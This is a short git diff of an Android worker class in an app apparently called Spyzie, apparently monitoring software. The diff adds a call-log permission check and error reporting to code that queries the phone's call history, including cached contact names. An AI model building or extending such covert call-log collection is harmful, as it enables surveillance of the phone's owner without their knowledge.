@@ -3,19 +3,18 @@ package com.tantd.spyzie.data.device.worker;
 import android.content.Context;
 import android.database.Cursor;
 import android.provider.CallLog;
-import android.util.Log;
 
 import androidx.annotation.NonNull;
-import androidx.work.Data;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
 import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.model.Call;
+import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.network.ApiManager;
+import com.tantd.spyzie.util.CommonUtils;
 
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.List;
 
 import javax.inject.Inject;
@@ -35,6 +34,12 @@ public class GetCallsWorker extends Worker {
     @Override
     public Result doWork() {
         SpyzieApplication.getInstance().getServiceComponent().inject(this);
+
+        if (!CommonUtils.hasCallPermission(getApplicationContext())) {
+            mApiManager.sendExceptionTracking(Error.HAS_NO_CALL_LOG_PERMISSION);
+            return Result.failure();
+        }
+
         String[] projection = new String[] {
                 CallLog.Calls._ID,
                 CallLog.Calls.CACHED_NAME,
